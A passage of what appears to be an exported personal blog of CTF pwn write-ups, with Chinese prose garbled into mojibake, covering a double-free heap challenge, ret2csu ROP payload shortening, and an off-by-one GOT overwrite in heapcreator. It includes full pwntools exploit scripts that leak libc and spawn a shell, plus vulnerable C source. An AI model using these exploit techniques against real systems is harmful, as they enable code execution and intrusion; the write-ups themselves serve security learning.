s[] (flag) è¿™ä¸ªç»“æ„åç»­è‚¯å®šå¯ä»¥åˆ©ç”¨ å¯ä»¥çœ‹åˆ°ï¼Œfreeåçš„æ•°æ®åŒºåŸŸå·²ç»è¢«æ¸…ç©º æˆ‘ç°åœ¨çš„æ€è·¯æ˜¯æ—¢ç„¶ç¨‹åºæœ¬èº«å¥½åƒæ²¡æœ‰æ¼æ´ï¼Œé‚£ä¹ˆè‚¯å®šä¸èƒ½å‘æ‹¿shellçš„æ€è·¯å»è¿›è¡Œäº† é‚£æˆ‘ä»¬ä¸å¦¨å°±è€ƒè™‘ä¿¡æ¯æ³„æ¼è¿™ä¸ªé€”å¾„ï¼Œæˆ‘ä»¬å¯ä¸å¯ä»¥åˆ©ç”¨double freeå‘¢ï¼Ÿå°è¯•æ”¹å†™fdæŒ‡é’ˆåˆ°byte_6020A0çš„ä½ç½®å¤„ï¼Œç„¶åshowæ‰“å°å†…å®¹ï¼Œå› ä¸ºbssæ®µé‚£æ ·çš„å†…å­˜åˆ†å¸ƒï¼Œä¸€ä¸ªå¯ä»¥æ³„æ¼å‡ºflagï¼Œæœ¬åœ°è°ƒè¯•ä¸€ä¸‹ å®éªŒä¸€ä¸‹å‘ç°ä¸å¯å–ï¼Œå› ä¸ºfreeåå°†å†…å®¹æ¸…ç©ºäº† é‚£ä¹ˆè¿˜æœ‰ä¸€ä¸ªæ€è·¯æ˜¯å› ä¸ºæˆ‘ä»¬æœ‰å †ç®¡ç†æŒ‡é’ˆï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä¸å¯ä»¥æ”¹å†™æŒ‡é’ˆåˆ°bssæ®µå‘¢ï¼Ÿå†åº¦å°è¯•ä¸€ä¸‹ è¿™ç§æ€è·¯ä¹Ÿå¤±è´¥äº†ï¼Œå› ä¸ºå‘ç°æ— æ³•è¿›è¡Œæº¢å‡ºï¼Œè¿ç©ºå­—èŠ‚éƒ½æ— æ³•æº¢å‡º æ€è·¯ä¸‰ï¼šæˆ–è®¸ä¹‹å‰å¤§chunké‡Œé¢æœ‰å¯ä»¥åˆ©ç”¨çš„ç‚¹ï¼Œæˆ‘ä»¬ä¸å¦¨çœ‹çœ‹ å¥½å§ï¼Œå¹¶æ²¡æœ‰å‘ç°ä»€ä¹ˆç„æœºï¼Œæˆ‘å‡†å¤‡çœ‹wpäº†:( å¼€å¹•é›·å‡»ï¼Œå‘ç°wpåˆ©ç”¨çš„æ˜¯double freeï¼Œä½†æ˜¯åœ¨ç¬¬ä¸€ä¸ªæ€è·¯é‡Œæˆ‘å¤±è´¥äº†ï¼Œæœ¬åœ°double freeä¼šæŠ¥é”™ï¼Ÿ oh no æˆ‘å‚»äº†ï¼Œdouble freeçš„åˆ©ç”¨æ¡ä»¶æ˜¯å‰åfreeçš„ä¸¤ä¸ªchunksizeè¦ç›¸åŒï¼Œè¿™æ ·åœ¨biné‡Œé¢æ‰ä¼šè¿æ¥èµ·æ¥ï¼Œcaoï¼Œæˆ‘æ˜¯sb è¿™æ ·å²‚ä¸æ˜¯ç®€å•å¾ˆå¤šäº†ï¼Ÿï¼Ÿæ·¦ï¼Œæœ¬æ¥å¯ä»¥è‡ªå·±å‡ºçš„ï¼Œç®—äº†ï¼Œåæ­£æ²¡çœ‹expï¼Œè‡ªå·±å†™expå¥½äº† å¯ä»¥çœ‹åˆ°å·²ç»å½¢æˆé—­ç¯äº†ï¼Œè‡³äºä¸ºå•¥é€‰0x60ï¼Œæ˜¯å› ä¸ºbssæ®µä¸Šé‚£ä¸ªæ•°å€¼æ˜¯96 å·²ç»ä¼ªé€ æˆåŠŸäº† exp from pwn import * #context.log_level = 'debug' local = 0 if local == 1: p = process('./gyctf_2020_some_thing_exceting') else: p = remote('node3.buuoj.cn',27898) def add(basize,bacontent,nasize,nacontent): p.sendlineafter('&gt; Now please tell me what you want to do :','1') p.sendlineafter('&gt; ba\\'s length :',str(basize)) p.sendafter('&gt; ba :',bacontent) p.sendlineafter('&gt; na\\'s length :',str(nasize)) p.sendafter('&gt; na :',nacontent) def delete(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '3') p.sendlineafter('&gt; Banana ID :',index) def show(index): p.sendlineafter('&gt; Now please tell me what you want to do :', '4') p.sendlineafter('&gt; Banana ID : &gt; SCP project ID :',index) add(0x30,'AAAAAAAA',0x50,'BBBBBBBB') #chunk0 add(0x30,'aaaaaaaa',0x50,'bbbbbbbb') #chunk1 delete('0') delete('1') delete('0') bss_6020A0 = 0x6020A0 - 0x8 add(0x50,p64(bss_6020A0),0x50,'A') #chunk2 add(0x50,'B',0x50,'C') #chunk3 show('3') print(p.recv()) p.interactive() ","link":"https://l3mon629.github.io/post/gyctf_2020_some_thing_exceting/"},{"title":"ret2csuâ€”ç¼©çŸ­payload","content":"èµ·å› æ˜¯è¿™æ ·çš„ï¼Œè·Ÿä¸€ä¸ªpwnå¸ˆå‚…èŠå¤©çš„æ—¶å€™ï¼Œä»–å‘ç»™æˆ‘äº†ä¸€é“é¢˜ï¼Œè¯´å¾ˆæœ‰æ„æ€ï¼Œæˆ‘å°±æ‰“å¼€æ¥çœ‹äº†çœ‹ mainå‡½æ•° int __cdecl main(int argc, const char **argv, const char **envp) { write(1, &quot;welcome~\\n&quot;, 9uLL); vul(); return 0; } vulå‡½æ•° ssize_t vul() { char buf; // [rsp+0h] [rbp-80h] return read(0, &amp;buf, 0x100uLL); } å°±è¿™ï¼Ÿ æˆ‘ä»–å¦ˆç›´æ¥ret2csu å…ˆå†™ä¸€ä¸‹åŸç†å§ï¼Œåˆ°æ—¶å€™å¤ä¹ æ¯”è¾ƒæ–¹ä¾¿ ret2csu __libc_csu_init é‡ç‚¹å…³æ³¨è¿™ä¸ªå‡½æ•° ä¸ºå•¥å‘¢ï¼Œå› ä¸ºå®ƒé‡Œé¢æœ‰å¾ˆå¥½çš„gadget æˆ‘ä»¬çŸ¥é“åœ¨64ä½ç¯å¢ƒä¸‹ï¼Œå‰å…­ä¸ªå‚æ•°æ˜¯ç”±å¯„å­˜å™¨æ¥ä¼ é€’çš„ï¼Œåˆ†åˆ«æ˜¯rdi rsi rdx rcx r8 r9 é‚£æˆ‘ä»¬çœ‹è¿™ä¸¤ä¸ªç‰‡æ®µ ç¬¬ä¸€ä¸ªæ˜¯popç‰‡æ®µ .text:000000000040060A pop rbx .text:000000000040060B pop rbp .text:000000000040060C pop r12 .text:000000000040060E pop r13 .text:0000000000400610 pop r14 .text:0000000000400612 pop r15 .text:0000000000400614 retn è¿™ä¸€ä¸²popå’Œretnåˆ†åˆ«æ‰“åˆ°äº†å¯„å­˜å™¨ä¸Šç„¶åè¿˜èƒ½retnï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦çš„æ˜¯é‚£å…­ä¸ªå¯„å­˜å™¨ï¼Œä½†æ˜¯çœ‹å‰ä¸€ä¸ªç‰‡æ®µ .text:00000000004005F0 mov rdx, r13 .text:00000000004005F3 mov rsi, r14 .text:00000000004005F6 mov edi, r15d .text:00000000004005F9 call qword ptr [r12+rbx*8] æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¥è°ƒæ•´å¯„å­˜å™¨è¿™æ ·ediï¼Œrsiï¼Œrdxå‰ä¸‰ä¸ªå¯„å­˜å™¨ä¾¿å¯ä»¥ç”±æˆ‘ä»¬æ¥æ§åˆ¶äº† åˆ©ç”¨ æˆ‘ä»¬çœ‹ctfwiki ç„¶åwikiç»™äº†ä¸€ä¸ªå‡ ä¹ä¸‡èƒ½çš„exp from pwn import * from LibcSearcher import LibcSearcher #context.log_level = 'debug' level5 = ELF('./level5') sh = process('./level5') write_got = level5.got['write'] read_got = level5.got['read'] main_addr = level5.symbols['main'] bss_base = level5.bss() csu_front_addr = 0x0000000000400600 csu_end_addr = 0x000000000040061A fakeebp = 'b' * 8 def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = 'a' * 0x80 + fakeebp payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64( r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += 'a' * 0x38 payload += p64(last) sh.send(payload) sleep(1) sh.recvuntil('Hello, World\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(sh.recv(8)) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') execve_addr = libc_base + libc.dump('execve') log.success('execve_addr ' + hex(execve_addr)) ##gdb.attach(sh) ## read(0,bss_base,16) ## read execve_addr and /bin/sh\\x00 sh.recvuntil('Hello, World\\n') csu(0, 1, read_got, 16, bss_base, 0, main_addr) sh.send(p64(execve_addr) + '/bin/sh\\x00') sh.recvuntil('Hello, World\\n') ## execve(bss_base+8) csu(0, 1, bss_base, 0, 0, bss_base + 8, main_addr) sh.interactive() è¿™ä¸ªæ¥æ³„æ¼libcæ˜¯é€šè¿‡writeå‡½æ•°ï¼Œéš¾åº¦ä¸Šæ¥è¯´æ¯”putsè¦æ›´éš¾äº† æ€è·¯å°±æ˜¯å…ˆæ³„æ¼libcï¼Œç„¶ååŠ«æŒreadå‡½æ•°ï¼Œå‘bssæ®µä¸Šå†™å…¥/bin/shï¼Œå’Œsystemä¹‹ç±»çš„ç³»ç»Ÿå‡½æ•°ï¼Œç„¶ååŠ«æŒç¨‹åºæµåˆ°bssæ®µæ‹¿shell è§£é¢˜ é‚£æˆ‘ä»¬ç›´æ¥ç…§æŠ„expå°±å¥½äº†ï¼Œåæ­£å¤§åŒå°å¼‚ï¼ˆæ‰“è„¸ from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060A def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' payload = b'a' * 0x88 payload += p64(0x40060A) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_base) + p64(0) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.recvuntil('~\\n') p.send(payload) p.send(p64(execve)) p.send('/bin/sh\\0') sleep(1) #p.send(p64(execve) + b'/bin/sh\\x00') æƒ³è±¡æ˜¯ç¾å¥½çš„ï¼Œä½†æ˜¯å¾ˆå¿«å°±å‘ç°äº†é—®é¢˜ ç¨‹åºæ ¹æœ¬æ— æ³•è·³è½¬åˆ°mainå‡½æ•°ï¼Œæ€è€ƒäº†å¥½ä¹…å°±æ˜¯æ²¡æƒ³é€š åæ¥ç»è¿‡å¸ˆå‚…æé†’å‘ç°payloadé•¿åº¦è¶…äº† åªå…è®¸read 0x100ä¸ªå­—èŠ‚ï¼Œé‚£æˆ‘ä»¬åªå¥½ç¼©å‡payload ç»è¿‡è°ƒè¯•å‘ç°rbxå¯„å­˜å™¨æœ¬æ¥å°±æ˜¯0ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥çœç•¥p64(rbx)ï¼Œç»“æœå‘ç°é•¿åº¦æ­£å¥½ä¸º0x100 ç„¶åç¬¬äºŒæ¬¡å‘bsså†™æ•°æ®çš„æ—¶å€™å°±åˆä¸è¡Œäº†ï¼Œè¿™ä¸ªæ—¶å€™rbxå°±ä¸æ˜¯0äº† æ‰€ä»¥æ¢ä¸ªæ€è·¯ï¼Œå°±ç”¨æ™®é€šæ ˆæº¢å‡ºçš„æ€è·¯ï¼Œæ‰¾åˆ°binshå’Œsystemçš„åœ°å€ï¼Œç›´æ¥æ‰§è¡Œ ç”±äºæˆ‘æœ¬åœ°çš„ç¯å¢ƒæœ‰å¾ˆå¤§é—®é¢˜ï¼ŒLibcSearcherä¸å‡†ï¼Œæ¯æ¬¡åç§»éƒ½å·®0x1000ï¼Œæˆ‘é€šè¿‡gdbçš„magicæ‰¾åˆ°äº†systemçš„åœ°å€ï¼Œä½†æ˜¯å®åœ¨æ‰¾ä¸åˆ°binshçš„åœ°å€äº†ï¼Œæ‰€ä»¥å°±æ­¤ä½œç½¢ï¼Œä½†æ˜¯ç†è®ºä¸Šæ˜¯ç»å¯¹å¯ä»¥æ‰“é€šçš„ æˆ‘è´´ä¸€ä¸‹æœ€åçš„exp from pwn import * from LibcSearcher import * context.log_level = 'debug' elf = ELF('./pwn2') p = process('./pwn2') #libc = ELF(&quot;./libc-2.23.so&quot;) write_got = elf.got['write'] read_got = elf.got['read'] main_addr = elf.symbols['main'] print(hex(main_addr)) bss_base = elf.bss() csu_front_addr = 0x4005F0 #csu_end_addr = 0x40060A csu_end_addr = 0x40060B def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 payload = b'a' * 0x88 payload += p64(csu_end_addr) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(csu_front_addr) payload += b'a' * 0x38 payload += p64(main_addr) p.send(payload) sleep(1) p.recvuntil('welcome~\\n') ## RDI, RSI, RDX, RCX, R8, R9, more on the stack ## write(1,write_got,8) csu(0, 1, write_got, 8, write_got, 1, main_addr) write_addr = u64(p.recv(8)) gdb.attach(p) libc = LibcSearcher('write', write_addr) libc_base = write_addr - libc.dump('write') print(hex(libc_base)) system = libc_base + libc.dump('system') binsh = libc_base + libc.dump('str_bin_sh') ''' libc = ELF('./libc-2.23.so') libc_base = write_addr - libc.symbols['write'] print('libcbase ----&gt; ' + hex(libc_base)) system = libc_base + libc.symbols['system'] binsh = libc_base + libc.search(b'/bin/sh').__next__() ''' p.recvuntil('~\\n') payload = b'a' * 0x88 pop_ret = 0x400613 payload += p64(pop_ret) + p64(binsh) + p64(system) print(&quot;binsh -----&gt; &quot; + hex(binsh)) print(&quot;system -----&gt; &quot; + hex(system)) p.sendline(payload) p.interactive() ç„¶åè´´ä¸€ä¸‹æˆ‘é­”æ”¹äº†å¸ˆå‚…çš„exp from pwn import * from LibcSearcher import LibcSearcher def ret2libc(leak, func, path=''): if path == '': libc = LibcSearcher(func, leak) base = leak - libc.dump(func) system = base + 0x3f550 - 0x1000 wrong = base + libc.dump('system') print(hex(wrong)) binsh = base + libc.dump('str_bin_sh') print('str çš„åç§»ä¸º ï¼š ' + hex(libc.dump('str_bin_sh'))) print('system çš„åç§»ä¸º ï¼š' + hex(libc.dump('system'))) else: libc = ELF(path) base = leak - libc.sym[func] system = base + libc.sym['system'] binsh = base + libc.search(b'/bin/sh').__next__() return (system,binsh,base) def csu(rbx, rbp, r12, r13, r14, r15, last): # pop rbx,rbp,r12,r13,r14,r15 # rbx should be 0, # rbp should be 1,enable not to jump # r12 should be the function we want to call # rdi=edi=r15d # rsi=r14 # rdx=r13 # or csu(0,1,got_write,1,got_write,8,main) The csu functions of different programs need to be analyzed concretely payload = b'a' * 0x88 payload += p64(gadget_pop) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15) payload += p64(gadget_call) payload += b'a' * 0x38 payload += p64(last) p.send(payload) return payload s = lambda data :p.send(str(data)) sa = lambda delim,data :p.sendafter(str(delim), str(data)) sl = lambda data :p.sendline(str(data)) sla = lambda delim,data :p.sendlineafter(str(delim), str(data)) r = lambda num=4096 :p.recv(num) ru = lambda delims, drop=True :p.recvuntil(delims, drop) itr = lambda :p.interactive() uu32 = lambda data :u32(data.ljust(4,b'\\0')) uu64 = lambda data :u64(data.ljust(8,b'\\0')) leak = lambda name,addr :log.success('{} = {:#x}'.format(name, addr)) context.log_level = 'DEBUG' binary = './pwn2' context.binary = binary elf = ELF(binary,checksec=False) def dbg(): gdb.attach(p) pause() p = process(binary) #p = remote(&quot;47.95.195.235&quot;,44002) #libc = ELF(&quot;./libc-2.23.so&quot;) main = 0x400587 gadget_pop = 0x40060B gadget_call =0x4005F0 got_write = elf.got['write'] p.recvuntil('\\n') csu(0,1,got_write,8,got_write,1,main) gdb.attach(p) #ru(&quot;welcome~\\n&quot;) write_addr = uu64(r(6)) print('write ---&gt; ' + hex(write_addr)) system,binsh,base = ret2libc(write_addr,'write','') print('system ----&gt; ' + hex(system)) print('binsh ----&gt; ' + hex(binsh)) print(hex(base)) pop_ret = 0x400613 payload3 = b'a' * 136 + p64(pop_ret) + p64(binsh) + p64(system) sla(&quot;welcome~\\n&quot;,payload3) itr() orz wtcl ","link":"https://l3mon629.github.io/post/ret2csu-suo-duan-payload/"},{"title":"ä¸€é“gotè¡¨å¯å†™çš„off-by-one â€” hitcontraining_heapcreator","content":"è¿™ä¸ªé¢˜å‡ºäº†ä¸€äº›å‘ç‚¹ï¼Œæˆ‘åäº†ï¼Œåšäº†å¥½ä¹… å…ˆæ­£å¸¸èµ°ä¸€éå§ off-by-oneçš„æµç¨‹å°±æ˜¯extend chunk ç²—ç³™çš„å†™ä¸€ä¸‹åˆ»åœ¨DNAé‡Œçš„expï¼Œç»†èŠ‚é—®é¢˜é”™äº†å°±é”™äº†å§ malloc(overflow) malloc(1) malloc(2) malloc(æˆ‘æ¥å®ˆæŠ¤ä¸Šé¢ä¿©ä¸œè¥¿ä¸è¢«top chunkåƒæ‰) edit(0,payload) free(1) free(2) leak_libc() some_functions_addr() malloc(size(1) + size(2)) edit(1,å†™åˆ°chunk2çš„fd pointer) ç„¶åå°±æ˜¯fastbin attack å—¯ï¼Œæˆ‘ä¸€å¼€å§‹ä¹Ÿè¿™æ ·åšçš„ï¼Œå¾ˆé¡ºåˆ©åœ¨æœ¬åœ°getshellï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€š åœ¨ä»“åº“é‡Œæœ‰æœ¬é¢˜ç›®çš„æºç  #include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;unistd.h&gt; void read_input(char *buf,size_t size){ int ret ; ret = read(0,buf,size); if(ret &lt;=0){ puts(&quot;Error&quot;); _exit(-1); } } struct heap { size_t size ; char *content ; }; struct heap *heaparray[10]; void menu(){ puts(&quot;--------------------------------&quot;); puts(&quot; Heap Creator &quot;); puts(&quot;--------------------------------&quot;); puts(&quot; 1. Create a Heap &quot;); puts(&quot; 2. Edit a Heap &quot;); puts(&quot; 3. Show a Heap &quot;); puts(&quot; 4. Delete a Heap &quot;); puts(&quot; 5. Exit &quot;); puts(&quot;--------------------------------&quot;); printf(&quot;Your choice :&quot;); } void create_heap(){ int i ; char buf[8]; size_t size = 0; for(i = 0 ; i &lt; 10 ; i++){ if(!heaparray[i]){ heaparray[i] = (struct heap *)malloc(sizeof(struct heap)); if(!heaparray[i]){ puts(&quot;Allocate Error&quot;); exit(1); } printf(&quot;Size of Heap : &quot;); read(0,buf,8); size = atoi(buf); heaparray[i]-&gt;content = (char *)malloc(size); if(!heaparray[i]-&gt;content){ puts(&quot;Allocate Error&quot;); exit(2); } heaparray[i]-&gt;size = size ; printf(&quot;Content of heap:&quot;); read_input(heaparray[i]-&gt;content,size); puts(&quot;SuccessFul&quot;); break ; } } } void edit_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Content of heap : &quot;); read_input(heaparray[idx]-&gt;content,heaparray[idx]-&gt;size+1); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void show_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ printf(&quot;Size : %ld\\nContent : %s\\n&quot;,heaparray[idx]-&gt;size,heaparray[idx]-&gt;content); puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } void delete_heap(){ int idx ; char buf[4]; printf(&quot;Index :&quot;); read(0,buf,4); idx = atoi(buf); if(idx &lt; 0 || idx &gt;= 10){ puts(&quot;Out of bound!&quot;); _exit(0); } if(heaparray[idx]){ free(heaparray[idx]-&gt;content); free(heaparray[idx]); heaparray[idx] = NULL ; puts(&quot;Done !&quot;); }else{ puts(&quot;No such heap !&quot;); } } int main(){ char buf[4]; setvbuf(stdout,0,2,0); setvbuf(stdin,0,2,0); while(1){ menu(); read(0,buf,4); switch(atoi(buf)){ case 1 : create_heap(); break ; case 2 : edit_heap(); break ; case 3 : show_heap(); break ; case 4 : delete_heap(); break ; case 5 : exit(0); break ; default : puts(&quot;Invalid Choice&quot;); break; } } return 0 ; } é€†å‘ å¾ˆå®¹æ˜“ï¼Œæ²¡æœ‰å»é™¤ç¬¦å·è¡¨ï¼Œå¾ˆnice åˆ›å»ºå †å—ï¼Œè¿™é‡Œmalloc(0x10)æ¥ç®¡ç†å †å— ç¼–è¾‘åŠŸèƒ½å­˜åœ¨off-by-oneæ¼æ´ï¼Œå¯ä»¥æº¢å‡ºä¸€å­—èŠ‚ freeåŠŸèƒ½æ²¡æœ‰use after free æ¼æ´ showåŠŸèƒ½ï¼Œå¯ä»¥æ¥leak libc pwn itï¼ï¼ï¼ æˆåŠŸçš„æ–¹æ³•ï¼šå€ŸåŠ©heaparrayæ¥æ”¹å†™æŒ‡é’ˆ å¯ä»¥çœ‹åˆ°ç®¡ç†ç”¨æˆ·å †çš„å†…å®¹ä¸Šæ˜¯æœ‰æŒ‡é’ˆçš„ï¼Œæˆ‘æœ€å–œæ¬¢æŒ‡é’ˆäº†ï¼ˆä¸æ˜¯ ç„¶åæˆ‘ä»¬å¯ä»¥æ”¹å†™æŒ‡é’ˆï¼Œå› ä¸ºé˜²æŠ¤æ˜¯è¿™æ ·çš„ï¼š æ‰€ä»¥å¯ä»¥æ”»å‡»gotè¡¨ï¼Œæ³¨æ„ï¼Œæ”»å‡»gotçš„è¡¨çš„æ ¸å¿ƒåœ¨äºï¼Œï¼Œè¿™ä¸ªé¢˜æ˜¯æœ‰ç°æˆçš„æŒ‡é’ˆå¯ä»¥åˆ©ç”¨ï¼å¦‚æœæ²¡æœ‰çš„è¯ï¼Œåœ¨ubuntu 16ä¸­ï¼Œæˆ‘ä»¬æ”»å‡»gotè¡¨çš„æˆæœ¬ä¼šå¾ˆé«˜ï¼Œå› ä¸ºè¦ä¼ªé€ fastbinçš„sizeä½ é‚£æˆ‘ä»¬æ€è·¯å°±æ˜¯æœ¬æ–‡ä¸€å¼€å§‹è¯´çš„ï¼Œåªä¸è¿‡ä¸è¦†ç›–fdæŒ‡é’ˆè€Œæ˜¯è¦†ç›–é¢˜ç›®ç»™æˆ‘ä»¬ç•™ä¸‹çš„ç½¢äº† å…ˆè¯´è¯´å‘ç‚¹å§ï¼Œæˆ‘ç”¨äº†libc-2.23.soï¼Œä½†æ˜¯è¿œç¨‹æ‰“ä¸é€šï¼Œæœ¬åœ°å¯é€šï¼Œå°±å¾ˆéš¾å—ï¼Œæ‰€ä»¥å¹²è„†ç›´æ¥LibcSearcher ï¼Œæµªè´¹äº†å¾ˆå¤šæ—¶é—´ ğŸ˜¦ å½“æ—¶åšé¢˜çš„æ€è·¯éƒ½å†™åœ¨printè¯­å¥é‡Œäº†ï¼Œè¿˜æŒºå¥½çš„ exp: from pwn import * from LibcSearcher import * #l3mon_w@nts_A_g1rLfri3nd (bushi) #context.log_level = 'debug' local = 1 if local == 1: p = process('./heapcreator') else: p = remote('node3.buuoj.cn',28861) #libc = ELF('./libc.so.6') elf = ELF('./heapcreator') def add(size,content): p.sendlineafter('Your choice :','1') p.sendlineafter('Size of Heap : ',str(size)) p.sendafter('Content of heap:',content) def edit(index,content): p.sendlineafter('Your choice :','2') p.sendlineafter('Index :',str(index)) p.sendafter('Content of heap : ',content) def show(index): p.sendlineafter('Your choice :','3') p.sendlineafter('Index :',str(index)) def delete(index): p.sendlineafter('Your choice :','4') p.sendlineafter('Index :',str(index)) print(&quot;ç¬¬äºŒä¸ªexpçš„æ€è·¯æ˜¯å› ä¸ºè¿™ä¸ªé¢˜ç›®æœ‰heaparrayæ¥ç®¡ç†æˆ‘ä»¬ç”³è¯·çš„å †å—ï¼Œåœ¨heaparrayä¸­æœ‰æŒ‡å‘å†…å®¹çš„æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥æ”¹å†™æŒ‡é’ˆæ¥è¦†ç›–gotè¡¨ï¼ˆgotè¡¨ï¼‰å¯å†™&quot;) add(0x18,'A') #chunk0 : to overflow the next chunk add(0x30,'B') #chunk1 pause() add(0x60,'C') #chunk2 add(0x10,'/bin/sh\\x00') #chunk3 : to protect edit(0,b'B' * 0x18 + b'\\xf1') delete(1) delete(2) print(&quot;æ­¤æ—¶big chunkå·²ç»æ„é€ å®Œæˆï¼Œby gdb , we know the unsorted bin fd ptr and bk ptr&quot;) print(&quot;(by free 0x60 , we can change the fd pointer to fastbin attack) &lt;-------------------- ä¹‹å‰çš„æ€è·¯&quot;) print(&quot;this method is attack free@got, the free(sth) = sysetm(/bin/sh;) &quot;) print(&quot;(if we cannot success ,we could use some methods to attack got) &lt;--------------------- so we change that :( !!!!!!!&quot;) add(0xe0,'E') #chunk4 = big chunk print(&quot;we can leak libc&quot;) show(1) p.recvuntil('Content : ') __malloc_hook = u64(p.recv(6) + b'\\x00\\x00') - 37 - 0x10 libc = LibcSearcher('__malloc_hook',__malloc_hook) libc_base = __malloc_hook - libc.dump('__malloc_hook') print(hex(libc_base)) print(&quot;by gdb , we know we already have leaked the libc&quot;) print(&quot;the next,we attack free@got &quot;) free_got = elf.got['free'] #free_addr = libc_base + libc.symbols['free'] system_addr = libc_base + libc.dump('system') print(&quot;free ----------&gt; &quot; + hex(free_got)) print(&quot;system -------&gt; &quot; + hex(system_addr)) payload = p64(__malloc_hook) * 2 payload = payload + p64(0) + p64(0x41) payload = payload + p64(0) * 7 + p64(0x21) + p64(0xe0) + p64(free_got) edit(1,payload) add(0x60,'AAAAAAAA') #chunk5 = chunk2 print(&quot;!!!!!!!!!!!!!!!!!!!!!! è¿™é‡Œä¸ç¡®å®šç¼–è¾‘å—5è¿˜æ˜¯å—2ï¼Œæˆ‘ä»¬å°±åŠ ä¸Šp.interactive()æ‹¿åˆ°åŸå§‹çš„äº¤äº’ç¨‹åºè°ƒè¯•ä¸€ä¸‹ï¼Œç»è¿‡è°ƒè¯•å‘ç°æ²¡æœ‰å—5ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åº”è¯¥ç¼–è¾‘chunk2&quot;) #edit(1,'BBBBBBBB') print(&quot;è¿™é‡Œå¾ˆå¥‡æ€ªï¼Œå½“æ—¶æˆ‘å‘ç°å¤§chunkçš„heaparrayåœ¨å®ƒä¸‹é¢ï¼Œæˆ‘è¿˜ä»¥ä¸ºæ˜¯ä¸­é—´å‡ºç°äº†ä¸å¯é¢„çŸ¥çš„é”™è¯¯ï¼Œä½†æ˜¯ç»è¿‡è°ƒè¯•å‘ç°ï¼Œå½“æˆ‘æ”¹å—1çš„æ—¶å€™ï¼Œfree_gotè¢«æ”¹äº†ï¼Œé‚£åªèƒ½è¯æ˜æ˜¯æ”¹chunk1äº†&quot;) print(&quot;å°å£°bbï¼Œç†ä¸æ¸…æµç¨‹å°±é€ä¸ªè°ƒè¯•ï¼ˆä¸æ˜¯ï¼‰&quot;) edit(1,p64(system_addr)) print(&quot;é€šè¿‡freeæ¥è§¦å‘ system(/bin/sh\\00) æœ¬åœ°æµ‹è¯•å¯æ‹¿shellï¼Œ ç¾æ±æ± :) å¥½ï¼Œå¥½èµ·æ¥äº†ï¼ˆä¸æ˜¯ï¼‰&quot;) delete(3) p.interactive() å¤±è´¥çš„æ–¹æ³•ï¼šone_gadgetæ‰“__malloc_hook æœ¬åœ°ä¹Ÿèƒ½æ‹¿shellï¼Œé‚£è‚¯å®šå°±æ˜¯libcçš„åŸå› äº†ï¼Œone_gadgetåœ°å€ä¸ä¸€æ ·çš„åŸå› åº”è¯¥æ˜¯ ä½†æ˜¯å¾ˆå¥‡è‘©ï¼Œä¸ºç¥é©¬è¿™ä¹ˆè¯´å‘¢ï¼Œå½“æˆ‘æ‰“one_gadgetçš„æ—¶å€™å‘ç°$rsp + 0x70çš„ä½ç½®æ˜¯NULLï¼Œä½†æ˜¯one_gadgetæ‰“ä¸é€šï¼Œåå€’æ˜¯rsp + 0x30å¯ä»¥é€š æˆªå›¾ï¼š 